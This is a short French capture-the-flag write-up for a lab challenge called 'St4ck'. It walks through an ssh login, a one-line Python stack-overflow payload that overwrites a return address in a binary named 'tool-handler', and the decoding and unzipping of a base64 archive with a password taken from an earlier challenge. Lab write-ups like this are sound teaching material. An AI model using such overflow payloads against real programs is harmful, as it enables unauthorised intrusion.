# St4ck - Write-up (C4llb4ck)

## Étape 1 : Connexion au serveur

Pour ce challenge, après nous être connecté en ssh avec la commande suivante :

```bash
ssh guest@ecorp.cyber.epitest.eu -p 1208
```

Nous étions à la recherche de la manière dont nous allons procéder pour pouvoir dézipper le fichier `srcs.zip` qui contient sûrement une information importante.

---

## Étape 2 : Exploitation du binaire

Nous avions donc utilisé la commande suivante :

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*240 + (0x4011a6).to_bytes(8,'little') + b'\n')" | /mnt/dev/./tool-handler 2>/dev/null | head -27
```

Cette commande est un payload qui permet d'exploiter une vulnérabilité dans le binaire `tool-handler`.

Grâce à ce payload nous avions pu extraire un hash du `tool-handler`.

---

## Étape 3 : Création du fichier base64

Ensuite, nous avions mis ce hash dans un fichier `/tmp/srcs.b64` grâce à la commande :

```bash
cat > /tmp/srcs.b64 << 'EOF'
UEsDBBQACQAIAOGBfFzdsoClVgQAAPwHAAANABwAc2VjcmV0LW1hbnVhbFVUCQADdfDHaXXwx2l1
eAsAAQToAwAABOgDAAA9d2VbyOvPIob+SBnL1WhlxwI220IE8omOqJzJNfUEB0lRYtqtwgfnTP+B
PAMhjs3nfoNJw3LJ7n+KDZ8vLSzK0CQczrNRWmd+9SR3cpgvC1ZRwC5UUNXkjmFQL4iNDkdzyU1j
t/Ma5ZBb0GXInj988kSM1dJwbfb02dSWVMdJyTBO7FpW8kvlucyAfqPv3fyrzJKmTdJc2FGhgXWz
1yBh65w+eZUKMixzbjBs97Drpj1cyKLg/AkOZFf0YuAvFcSe9J/1v7ZYy5FaIj/CtU1qzMi0kU56
GukWCeXrpP78W97aYqisSk88M9YNxEHDrFy/kBY4yoG2Ms602fu7dLg899IcUpCltLoW21lo99dB
A8wBsA8fxNTazVr9f6j0NuZjOCdatjezxlpvodR+TpcON9jmNtQ4f0pKIwmt6kY0yXpEg37uYrB+
TpQaIBH8nadsrFi2SNvlYgaEhWhKSG1i/KFTWRgMZB1WBc1QRePb0TPqutT7Mu7PBqP3Y/DG0g7T
ciT+vpDYrPPo32bQuFmIw0wLSZ3tMQ/v+nIukBOc5HndGFJYMpAzn/Ofcb9iE5wXbF5QKQ2DKZT5
GenaNBpGbnclzpb5Ln8wDQFqtP6pS+lPHeeJrQgGdgHjI+8y3peBGBITQiMQ7FbC29l7insna8Fa
KT6pV1a6Wuk3KF8+TbNBfqB6zLpT+i1tcj/PDK0BlAvZgbxo0hCRRTRnuOIx8n4ykkrJ6JM5xJOG
wvPL5sqPBgihAhSUtEU3bdA/W+0g5824eMF89AmUiZsBbBlvq2rYBTCgm4PGmqTrzcwDq9i6o/kZ
muMQgdSrZhNpAm70wzd9FPhvDvY0V+m6uaAzK0+70DdZQT58qq21g3872XHdWwjbyRtUUyXfeInA
4NlDRuYomGq6omWLUNQgXqFvE1MiBiXg9BUHy/AGwInY1/oBO18ukD4Kgu4UyLbJjcfsxl9pwAKj
T4cNyG1OLODFzz3h5EFqDH8kldhek6lQAOaGz320uqFY8T5ORCWDKDe0TN97r6NdKGAleK6dLbHW
Xn2YGPZkp71Os7W9pzDwuk+MFDrv9D7CkN5a1GSwQEfkX06fnDderw+X3OFdi+ujU4TBmN9j23kL
XD8LOCos7HQ6zDt1yH+6u2ZWmz/gEBWpD41kBJwU+mUnbKZZg0+qJGQz5S60K/FR/YWlbtPAjGCi
URL8WcFQU4E/FwQLWzl/Ni9QxjNr+rqYUxYSZPmM/XKtes3BcXO1tUwxTaBrltwcawtw2R2//f1H
NKwRKBsVMVM3irdLJWuCoI3sKTTmrdcEL/NIGPYKaHELTo3Uykz2vz5edNq7R9o0djFOs34x8SMt
ugvVUl7VcZ058OxhzztZmD8U62qWpRZ/TAnE6At6YQzJMkljgkd2cD3gr0N1NEIRdig7MaoCp0mP
T6+jj1ZLcc14CEcbMfqALVMUpwhA6axH7ADW7N6z+ROo301BDOe3cz5QSwcI3bKApVYEAAD8BwAA
UEsBAh4DFAAJAAgA4YF8XN2ygKVWBAAA/AcAAA0AGAAAAAAAAQAAALSBAAAAAHNlY3JldC1tYW51
YWxVVAUAA3Xwx2l1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBTAAAArQQAAAAA
EOF
```

---

## Étape 4 : Décodage du fichier

Puis nous avions utilisé la commande suivante pour décoder le fichier base64 en fichier zip :

```bash
base64 -d /tmp/srcs.b64 > /tmp/srcs.zip
```

---

## Étape 5 : Décompression du fichier

Ensuite, nous avons utilisé le mot de passe que nous avions trouvé dans un challenge précédent :

```
Th1s_is_one_hell_of_a_P4ssw0rd
```

Pour décompresser le fichier zip avec ce mot de passe :

```bash
unzip -P Th1s_is_one_hell_of_a_P4ssw0rd /tmp/srcs.zip
```

---

**Mission accomplie** : Le cinquième challenge a été résolu avec succès en exploitant une vulnérabilité de type buffer overflow/ret2libc pour extraire et décompresser un fichier zip protégé.
